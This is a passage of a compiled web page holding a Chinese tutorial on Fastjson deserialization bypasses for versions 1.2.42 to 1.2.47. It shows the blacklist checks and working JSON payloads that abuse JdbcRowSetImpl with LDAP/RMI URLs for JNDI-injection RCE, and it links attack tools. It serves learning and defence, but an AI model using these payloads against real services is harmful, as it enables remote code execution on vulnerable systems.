</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+j+'" alt="image-20230619162339270" tabindex="0" loading="lazy"><figcaption>image-20230619162339270</figcaption></figure><p>就可以在绕过黑名单检测；</p><figure><img src="'+N+'" alt="image-20230619163158122" tabindex="0" loading="lazy"><figcaption>image-20230619163158122</figcaption></figure><p>在loadclass方法中去掉多余的字符，从而调用正确的类<code>JdbcRowSetImpl</code>。</p><figure><img src="'+_+`" alt="image-20230619163319115" tabindex="0" loading="lazy"><figcaption>image-20230619163319115</figcaption></figure><hr><h3 id="fastjson-1-2-42" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-42" aria-hidden="true">#</a> fastjson=1.2.42</h3><p>42版本中开发人员将明文黑名单改成了hash黑名单，已经有人碰撞出了不少；https://github.com/LeadroyaL/fastjson-blacklist</p><p>在处理前一种黑名单绕过的时候做了一个校验，如果<strong>类名</strong>以<code>L</code>开头，<code>;</code>结尾，则会用stubstring去掉(这个判断是由HASH来判断的）但是没有考虑到双写或多写的情况，也就是说这种方法只能防御一组L和;，：</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>bypass（双写绕过）</strong></p><p><strong>前提：需要开启autotype</strong></p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token punctuation">{</span>
    <span class="token string-property property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="token punctuation">,</span>
    <span class="token string-property property">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://127.0.0.1:2357/Command8&quot;</span><span class="token punctuation">,</span>
    <span class="token string-property property">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="fastjson-1-2-43" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-43" aria-hidden="true">#</a> fastjson=1.2.43</h3><p>针对双写绕过套了个子判断。</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655656408941810501L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>TypeUtils.loadClass 中除了对<code>L;</code>进行判断，还有对<code>[</code>进行了判断</p><div class="language-javascript line-numbers-mode" data-ext="js"><pre class="language-javascript"><code><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&#39;[&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> componentType <span class="token operator">=</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+x+`" alt="image-20230619180428246" tabindex="0" loading="lazy"><figcaption>image-20230619180428246</figcaption></figure><p><strong>Bypass</strong></p><p><strong>前提：需要开启autotype</strong></p><p>构造如下payload，具体为啥这么构造没有细跟，反正跟<code>[</code>有关</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code><span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;[com.sun.rowset.JdbcRowSetImpl”[{,&quot;</span>dataSourceName<span class="token string">&quot;:&quot;</span>ldap<span class="token operator">:</span><span class="token comment">//localhost:9999/a&quot;,&quot;autoCommit&quot;:true}&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首先是<code>[com.sun.rowset.JdbcRowSetImpl</code>，通过这个方式可以过checkAutotype检测。</p><p>其次是<code>[{,&quot;dataSourceName</code>，这里的<code>[{</code>主要目的是通过fastjson的自动检测，实际上就是对token进行控制，这里如果是<code>[</code>的话就会让token变为14从而通过之后的检测。</p><p>https://blog.csdn.net/qq_36869808/article/details/123201615</p><h3 id="fastjson-1-2-47" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-47" aria-hidden="true">#</a> fastjson&lt;=1.2.47</h3><p>44版本针对43版本的绕过作了处理，[ 开头或者 L 开头 ; 结尾都会抛出异常</p><p><strong>Bypass</strong></p><p><strong>前提：1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</strong></p><p>攻击json如下：</p><div class="language-json line-numbers-mode" data-ext="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;a&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>                              
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.Class&quot;</span><span class="token punctuation">,</span>           <span class="token comment">//放入内存</span>
        <span class="token property">&quot;val&quot;</span><span class="token operator">:</span> <span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token property">&quot;b&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span>   <span class="token comment">//触发payload弹计算器</span>
        <span class="token property">&quot;dataSourceName&quot;</span><span class="token operator">:</span> <span class="token string">&quot;rmi://ip/exp&quot;</span><span class="token punctuation">,</span>  
        <span class="token property">&quot;autoCommit&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在DefaultJSONParser类中。传进来的@type的值要进入一个checkAutoType()方法的判断：</p><figure><img src="`+S+'" alt="image-20230609105231200" tabindex="0" loading="lazy"><figcaption>image-20230609105231200</figcaption></figure><p>能够看出来这个方法中，会先做一个黑白名单的判断，</p><figure><img src="'+J+'" alt="image-20230609105736726" tabindex="0" loading="lazy"><figcaption>image-20230609105736726</figcaption></figure><p>在调用解析时我们没有传入预期的反序列化对象的对应类名时，会从mapping中或者deserializers.findClass()寻找，当找到类之后会直接return class，不会再进行autotype和黑名单校验，而在deserializers中有<code>java.lang.Class</code></p><p>先在mapping里找java.lang.class，找不到</p><figure><img src="'+w+'" alt="image-20230609142233848" tabindex="0" loading="lazy"><figcaption>image-20230609142233848</figcaption></figure><p>去deserializers找，能找到</p><figure><img src="'+D+'" alt="image-20230609142504773" tabindex="0" loading="lazy"><figcaption>image-20230609142504773</figcaption></figure><p>进入checkAutoType，校验通过</p><figure><img src="'+I+'" alt="image-20230609142713545" tabindex="0" loading="lazy"><figcaption>image-20230609142713545</figcaption></figure><figure><img src="'+O+'" alt="image-20230609142013160" tabindex="0" loading="lazy"><figcaption>image-20230609142013160</figcaption></figure><p>在校验autotype和黑名单之前就已经return了clazz，变相绕过了黑名单，利用JNDI注入实现RCE。</p><h3 id="各版本攻击方式汇总" tabindex="-1"><a class="header-anchor" href="#各版本攻击方式汇总" aria-hidden="true">#</a> 各版本攻击方式汇总</h3><p>https://github.com/safe6Sec/Fastjson</p><h2 id="_4-工具使用" tabindex="-1"><a class="header-anchor" href="#_4-工具使用" aria-hidden="true">#</a> 4. 工具使用</h2><h3 id="jndi注入工具" tabindex="-1"><a class="header-anchor" href="#jndi注入工具" aria-hidden="true">#</a> JNDI注入工具</h3><p>下载地址：https://github.com/welk1n/JNDI-Injection-Exploit/tree/master，</p><p>https://github.com/wyzxxz/jndi_tool</p><p>类似的工具很多，github搜索JNDI即可。</p><p>起rmi或ldap服务，命令如下：</p><figure><img src="'+z+'" alt="image-20230529100551944" tabindex="0" loading="lazy"><figcaption>image-20230529100551944</figcaption></figure><p><strong>ldap:</strong></p><figure><img src="'+C+'" alt="image-20230529100957138" tabindex="0" loading="lazy"><figcaption>image-20230529100957138</figcaption></figure><h3 id="fastjson攻击工具" tabindex="-1"><a class="header-anchor" href="#fastjson攻击工具" aria-hidden="true">#</a> fastjson攻击工具</h3><p>https://github.com/a1phaboy/FastjsonScan</p><p>https://github.com/mrknow001/fastjson_rec_exploit 完全基于dnslog，适合能访问外网的靶机</p><p>防御</p><p>https://github.com/YoungBear/FastjsonPoc</p>',148),R=[A];function U(T,E){return s(),a("div",null,R)}const F=n(L,[["render",U],["__file","FastjsonVul.html.vue"]]);export{F as default};
